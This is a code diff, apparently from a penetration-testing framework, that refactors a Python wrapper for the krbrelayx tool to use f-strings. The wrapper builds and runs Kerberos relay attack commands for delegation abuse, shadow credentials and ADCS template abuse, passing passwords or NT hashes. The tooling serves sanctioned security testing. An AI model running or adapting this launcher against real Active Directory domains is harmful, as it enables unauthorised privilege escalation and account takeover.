@@ -1,5 +1,4 @@
 """krbrelayx — Kerberos relay and RBCD/shadow credentials abuse."""
-from __future__ import annotations
 import subprocess
 import sys
 import shutil
@@ -28,24 +27,24 @@ def run(args: Any) -> int:
     cmd = ["krbrelayx.py"]
 
     if mode == "rbcd":
-        cmd.extend(["-t", "ldap://{}".format(target)])
+        cmd.extend(["-t", f"ldap://{target}"])
         cmd.append("--delegate-access")
     elif mode == "shadow":
-        cmd.extend(["-t", "ldap://{}".format(target)])
+        cmd.extend(["-t", f"ldap://{target}"])
         cmd.append("--shadow-credentials")
     elif mode == "adcs":
         template = getattr(args, "adcs_template", "Machine")
-        cmd.extend(["-t", "http://{}".format(target)])
+        cmd.extend(["-t", f"http://{target}"])
         cmd.extend(["--adcs", "--template", template])
 
     if cred.username:
-        cmd.extend(["-u", "{}@{}".format(cred.username, cred.domain)])
+        cmd.extend(["-u", f"{cred.username}@{cred.domain}"])
     if cred.password:
         cmd.extend(["-p", cred.password])
     elif cred.has_hash:
-        cmd.extend(["--hashes", "{}:{}".format(cred.lm_hash, cred.nt_hash)])
+        cmd.extend(["--hashes", f"{cred.lm_hash}:{cred.nt_hash}"])
 
-    print("[*] krbrelayx: mode={}, target={}".format(mode, target))
+    print(f"[*] krbrelayx: mode={mode}, target={target}")
     print("[*] Command: {}".format(" ".join(cmd)))
 
     try:
@@ -55,5 +54,5 @@ def run(args: Any) -> int:
             print(result.stderr, file=sys.stderr)
         return result.returncode
     except Exception as exc:
-        print("[-] krbrelayx error: {}".format(exc), file=sys.stderr)
+        print(f"[-] krbrelayx error: {exc}", file=sys.stderr)
         return 1
